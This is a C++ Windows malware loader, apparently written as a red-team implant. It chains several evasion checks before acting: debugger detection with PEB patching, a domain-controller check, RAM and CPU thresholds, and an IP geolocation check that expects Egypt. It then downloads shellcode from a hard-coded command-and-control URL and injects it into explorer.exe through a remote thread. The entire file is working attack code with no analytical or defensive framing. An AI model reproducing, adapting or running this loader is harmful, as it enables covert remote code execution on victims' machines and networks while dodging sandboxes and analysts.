
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include<winternl.h>
#include <string>
#include <urlmon.h>
#include <cstdio>
#include <lm.h>
#include<stdio.h>
#include <winhttp.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "netapi32.lib")
using namespace std;

// Ensure C-style linkage
extern "C" {
    extern PPEB getPEB(void);
    extern BYTE PEBPatcher(void);
}

int PatchPEBForDebugger(void) {
    printf("[*] Getting the PEB...\n");
    PPEB pPEB = getPEB();
    printf("[+] PEB Address: 0x%p\n", pPEB);

    if (pPEB->BeingDebugged != 0) {
        printf("[*] PEB->BeingDebugged: 0x%d\n", pPEB->BeingDebugged);
        printf("[*] Debugger Detected!!\n[+] Patching the PEB...\n");
        PEBPatcher();

        if (pPEB->BeingDebugged == 0) {
            printf("[*] PEB patched successfully.\n");
            MessageBoxW(NULL, L"Debugger Patched Successfully!", L"Success", MB_ICONINFORMATION | MB_OK);
        }
        else {
            printf("[!] Failed to patch the PEB.\n");
            return -1; // Indicate failure
        }
    }
    else {
        printf("[*] PEB->BeingDebugged: 0x%d\n", pPEB->BeingDebugged);
        printf("[*] No Debugger Detected.\n");
        MessageBoxW(NULL, L"No Debugger Detected!", L"Status", MB_ICONINFORMATION | MB_OK);
        return 0; // Indicate no action needed
    }

    return 1; // Indicate successful patching
}

// Function to check if the system is a domain controller
BOOL isDomainController() {
    LPCWSTR dcName = nullptr;
    if (NetGetDCName(NULL, NULL, (LPBYTE*)&dcName) == NERR_Success) {
        if (dcName && wcslen(dcName) > 0) {
            wcout << L"[+] Domain Controller detected: " << dcName << L"\n";
            NetApiBufferFree((LPVOID)dcName); // Explicit cast to LPVOID
            return TRUE;
        }
    }
    NetApiBufferFree((LPVOID)dcName); // Explicit cast to LPVOID
    return FALSE;
}


DWORD getProcessIdByName(const wstring& processName) {
    DWORD pid = 0;

    // Take a snapshot of all processes in the system
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        cerr << "[-] Failed to create process snapshot.\n";
        return pid;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // Compare the current process name with the target process name
            if (processName == pe32.szExeFile) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    else {
        cerr << "[-] Failed to retrieve process entry.\n";
    }

    // Clean up the snapshot handle
    CloseHandle(hSnapshot);

    if (pid == 0) {
        wcerr << L"[-] Process " << processName << L" not found.\n";
    }
    else {
        wcout << L"[+] Found process " << processName << L" with PID: " << pid << L".\n";
    }

    return pid;
}

bool checkIP(const string& expectedCountry) {
    // Initialize variables
    wstring externalIPHost = L"api.ipify.org";
    wstring externalIPPath = L"/?format=text";

    wstring countryCheckHost = L"ipapi.co";

    HINTERNET hSession = WinHttpOpen(L"A Custom Geolocation Agent/1.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        cerr << "[-] Failed to open WinHTTP session.\n";
        return false;
    }

    // Function to make HTTP request
    auto sendHttpRequest = [&](const wstring& host, const wstring& path) -> string {
        HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) {
            cerr << "[-] Failed to connect to host.\n";
            return "";
        }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(),
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
        if (!hRequest) {
            cerr << "[-] Failed to open HTTP request.\n";
            WinHttpCloseHandle(hConnect);
            return "";
        }

        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
            !WinHttpReceiveResponse(hRequest, NULL)) {
            cerr << "[-] Failed to send or receive HTTP request.\n";
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            return "";
        }

        DWORD size = 0;
        string response;
        do {
            WinHttpQueryDataAvailable(hRequest, &size);
            if (size == 0) break;

            char* buffer = new char[size + 1];
            DWORD downloaded = 0;
            WinHttpReadData(hRequest, buffer, size, &downloaded);

            buffer[downloaded] = '\0';
            response.append(buffer, downloaded);
            delete[] buffer;
        } while (size > 0);

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return response;
        };

    // Get the external IP
    string ip = sendHttpRequest(externalIPHost, externalIPPath);
    if (ip.empty()) {
        cerr << "[-] Failed to obtain external IP address.\n";
        WinHttpCloseHandle(hSession);
        return false;
    }
    cout << "[+] External IP: " << ip << "\n";

    // Check if the IP belongs to the expected country
    wstring countryCheckPath = L"/" + wstring(ip.begin(), ip.end()) + L"/json";
    string countryResponse = sendHttpRequest(countryCheckHost, countryCheckPath);

    WinHttpCloseHandle(hSession);

    if (countryResponse.empty()) {
        cerr << "[-] Failed to retrieve country information.\n";
        return false;
    }

    if (countryResponse.find(expectedCountry) != string::npos) {
        cout << "[+] Machine is in the expected country.\n";
        return true;
    }

    cout << "[-] Machine is not in the expected country. Possible sandbox detected.\n";
    return false;
}



BOOL memoryCheck() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);

    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 4.00 && sysinfo.dwNumberOfProcessors >= 2) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}


int downloadAndExecute() {
    HANDLE hProcess = NULL;
    const SIZE_T dwSize = 510; // Shellcode size
    const DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    const DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr = NULL;
    SIZE_T bytesOut = 0;

    // Target process name
    std::wstring targetProcess = L"explorer.exe";

    // Get the PID of the target process
    DWORD PID = getProcessIdByName(targetProcess);
    if (PID == 0) {
        std::wcerr << L"[-] Failed to find process: " << targetProcess << L". Ensure it is running.\n";
        return -1;
    }

    // Open the target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (!hProcess) {
        std::wcerr << L"[-] Failed to open process " << targetProcess << L". Error: " << GetLastError() << L"\n";
        return -1;
    }
    std::wcout << L"[+] Successfully opened process " << targetProcess << L" with PID " << PID << L".\n";

    // URL of the shellcode
    const char* c2URL = "http://192.168.188.148/index.raw";
    IStream* stream = nullptr;

    // Buffer for shellcode
    char buffer[dwSize] = { 0 };
    ULONG bytesRead = 0;
    std::string shellcode;

    // Download shellcode
    HRESULT hr = URLOpenBlockingStreamA(nullptr, c2URL, &stream, 0, 0);
    if (FAILED(hr)) {
        std::cerr << "[-] Failed to download shellcode from C2 URL. HRESULT: " << hr << "\n";
        CloseHandle(hProcess);
        return -1;
    }

    while (true) {
        hr = stream->Read(buffer, sizeof(buffer), &bytesRead);
        if (FAILED(hr)) {
            std::cerr << "[-] Failed to read from stream. HRESULT: " << hr << "\n";
            stream->Release();
            CloseHandle(hProcess);
            return -1;
        }
        if (bytesRead == 0) break; // End of stream
        shellcode.append(buffer, bytesRead);
    }
    stream->Release();

    if (shellcode.size() != dwSize) {
        std::cerr << "[-] Shellcode size mismatch. Expected " << dwSize << " bytes but received " << shellcode.size() << " bytes.\n";
        CloseHandle(hProcess);
        return -1;
    }
    std::cout << "[+] Shellcode downloaded successfully.\n";

    // Allocate memory in the target process
    memAddr = VirtualAllocEx(hProcess, nullptr, dwSize, flAllocationType, flProtect);
    if (!memAddr) {
        std::cerr << "[-] VirtualAllocEx failed. Error: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return -1;
    }

    // Write shellcode to the allocated memory
    if (!WriteProcessMemory(hProcess, memAddr, shellcode.data(), dwSize, &bytesOut)) {
        std::cerr << "[-] WriteProcessMemory failed. Error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, memAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    std::cout << "[+] Shellcode written to target process memory.\n";

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)memAddr, nullptr, 0, nullptr);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread failed. Error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, memAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    std::cout << "[+] Remote thread created successfully. Shellcode executed.\n";

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}



int main() {
    Sleep(1000);
    if (PatchPEBForDebugger() != -1) {
        if (isDomainController() == TRUE) {
            if (memoryCheck() == TRUE) {
                if (checkIP("Egypt") == TRUE) {
                    cout << "not in sandbox ";
                    downloadAndExecute();
                }
            }
        }
    }
    return 0;
}



